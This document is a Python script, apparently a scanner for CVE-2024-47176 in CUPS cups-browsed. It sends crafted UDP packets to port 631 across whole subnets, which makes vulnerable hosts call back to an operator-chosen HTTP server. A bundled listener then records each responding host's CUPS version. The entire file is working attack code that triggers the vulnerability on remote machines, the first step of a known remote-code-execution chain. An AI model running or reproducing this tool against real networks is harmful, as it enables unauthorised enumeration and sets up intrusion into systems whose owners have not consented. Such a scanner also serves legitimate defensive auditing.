#!/usr/bin/env python3
r'''
CVE-2024-47176
'''
import socket, optparse, os, threading, time
iTimeout= 5
iDstPort = 631
sKeyword = 'CupsAndBalls' ## This is added to the POST request to tie the scanner & server together
lstAllResponses = []

def send_only(s, ip, port, string):
    data = bytes.fromhex(string.encode().hex())
    s.sendto(data, (ip, port))

def recv_only(s):
    data, addr=s.recvfrom(1024)
    return data, addr

def getIPs(cidr):
    def ip2bin(ip):
        b = ''
        inQuads = ip.split('.')
        outQuads = 4
        for q in inQuads:
            if q != '':
                b += dec2bin(int(q),8)
                outQuads -= 1
        while outQuads > 0:
            b += '00000000'
            outQuads -= 1
        return b

    def dec2bin(n,d=None):
        s = ''
        while n>0:
            if n&1: s = '1' + s
            else: s = '0' + s
            n >>= 1
        if d is not None:
            while len(s)<d: s = '0' + s
        if s == '': s = '0'
        return s

    def bin2ip(b):
        ip = ''
        for i in range(0,len(b),8): ip += str(int(b[i:i+8],2)) + '.'
        return ip[:-1]

    iplist=[]
    parts = cidr.split('/')
    if len(parts) == 1:
        iplist.append(parts[0])
        return iplist
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    if subnet == 32:
        iplist.append(bin2ip(baseIP))
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)): iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return iplist

def getIPsFromFile(sFile):
    lstLines = open(sFile,'r').read().splitlines()
    lstIPs = []
    for sLine in lstLines: ## Line can be an IP or a CIDR
        for sIP in getIPs(sLine): lstIPs.append(sIP)
    return lstIPs

def parseResponse(sData, boolVerbose):
    lstResponse = sData.split('\n')
    sSource = sVersion = None
    for sLine in lstResponse:
        if not sSource and sKeyword in sLine:
            sSource = sLine.split(f'{sKeyword}_')[1].split(' ')[0]
            if sSource in lstAllResponses: return
            else: lstAllResponses.append(sSource)
        if 'User-Agent' in sLine: sVersion = sLine.split('User-Agent: ')[1]
    if boolVerbose: print(sData)
    if sSource and sVersion: print('[+] Success, system with IP {} has CUPS version: {}'.format(sSource, sVersion))
    return

def runServer(sIP, iPort, boolVerbose):
    oServSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        oServSock.bind((sIP, iPort))
        oServSock.listen(iTimeout)
        print(f'[+] Started listener on {sIP}:{iPort}\n    Press Ctrl+Break (Ctrl+F6) to stop')
        while True:
            oClientSock, address = oServSock.accept()
            bData = b''
            while True:
                bDatapart = oClientSock.recv(1024)
                bData += bDatapart
                if len(bDatapart) < 1024: break
            sRequest = bData.decode('utf-8', errors='ignore')
            parseResponse(sRequest, boolVerbose)
            oClientSock.sendall(b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nThank you\r\n')
            oClientSock.close()
    except Exception as e: print(f'[-] Error: {e}')
    finally: oServSock.close()
    return

def sendCUPS(sIP, iPort, sServer, boolVerbose):
    oSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    oSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    oSock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    oSock.settimeout(iTimeout)
    sData='0 3 http://{}/printers/{}_{}'.format(sServer, sKeyword, sIP)
    if boolVerbose: print('[+] Sending to {}:{}'.format(sIP, iPort))
    send_only(oSock, sIP, iPort, sData)
    oSock.close()
    return

def main():
    sUsage = ('usage: %prog [options] SUBNET/ADDRESS/FILE\n'
              'This script performs threaded enumeration of CUPS Browsed listeners on UDP 631\n'
              'Requires a reachable listener, run this script as server-only or some generic NetCat one\n'
              'Server-only: %prog -s 192.168.50.10:80 -n -r\n'
              'Scanner-only: %prog -s 192.168.50.10:80 10.11.12.0/24\n'
              'Server & Scanner: %prog -s 192.168.50.10:80 -r 10.11.12.0/24'
              )
    oParser = optparse.OptionParser(usage=sUsage)
    oParser.add_option('--server', '-s', metavar='STRING', help='Provide HTTP Server details like this IP:PORT, always required')
    oParser.add_option('--runserver', '-r', action='store_true', help='Start the listening HTTP server locally, default False', default=False)
    oParser.add_option('--noscan', '-n', action='store_true', help='Do no perform the scan, useful for listening only', default=False)
    oParser.add_option('--verbose', '-v', action='store_true', help='Verbosity. Default False', default=False)
    (oOptions, lstArgs) = oParser.parse_args()
    if not oOptions.server or not ':' in oOptions.server: 
        print('[-] Error, please provide at least the listening endpoint details in the form IP:PORT')
        exit()
    boolServe = True if oOptions.runserver == True else False
    boolScan = False if oOptions.noscan == True else True

    if boolServe:
        oServerThread = threading.Thread(target=runServer, args=(oOptions.server.split(':')[0], int(oOptions.server.split(':')[1]), oOptions.verbose))
        oServerThread.start()
        time.sleep(1)
    if boolScan:
        if not lstArgs or not len(lstArgs) == 1:
            sCIDR = input('[?] Please enter the subnet or IP to scan [192.168.50.0/24] : ')
            if sCIDR == '': sCIDR = '192.168.50.0/24'
            lstIPs = getIPs(sCIDR)
        elif boolScan:
            if os.path.isfile(lstArgs[0]):
                print('[+] Parsing file {} for IP addresses/networks.'.format(lstArgs[0]))
                lstIPs = getIPsFromFile(lstArgs[0])
            else: 
                lstIPs = getIPs(lstArgs[0])
        if oOptions.server.split(':')[0] in lstIPs: lstIPs.remove(oOptions.server.split(':')[0])
        print('[!] Sending requests to {} addresses'.format(len(lstIPs)))
        for sIP in lstIPs: sendCUPS(sIP, iDstPort, oOptions.server, oOptions.verbose)
    if boolServe: print('[!] Hold on, waiting for responses ...')
    return

if __name__ == '__main__':
    main()
